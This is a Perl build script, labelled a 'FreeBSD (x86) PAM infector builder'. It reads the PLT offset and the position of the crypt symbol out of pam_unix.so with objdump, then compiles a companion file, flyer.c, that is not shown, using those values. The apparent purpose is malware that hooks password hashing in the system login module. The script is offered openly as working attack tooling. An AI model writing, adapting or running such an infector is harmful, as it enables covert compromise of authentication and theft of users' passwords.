#!/usr/bin/perl 

print "FreeBSD (x86) PAM infector builder\n";

# get PLT_OFFS
$plt_rec = `objdump -h /usr/lib/pam_unix.so | grep -a " .plt"`;
chomp $plt_rec;
$plt_rec =~ tr/ //;

($a, $b, $c) = split(/0000/, $plt_rec);
$plt = "0x$c";
print "use PLT_OFFS $plt\n";

# get CRYPT_NUM
@got_tbl = `objdump -R /usr/lib/pam_unix.so | grep JUMP | sort`;
chomp @got_tbl;

for ($i=0; $i < $#got_tbl; $i++)
{
  if ($got_tbl[$i] =~ m/ crypt/)
  {
    if (!$crypt_num){ $crypt_num = $i; }
  }
}
print "use CRYPT_NUM $crypt_num\n";

# build?

if ($ARGV[0] eq "build")
{
  system("gcc -o flyer -D_SET -DPLT_OFFS=$plt".
    " -DCRYPT_NUM=$crypt_num flyer.c"); 

  print "done\n";
} else {
  print "try '$0 build' to compile\n";
}

exit;
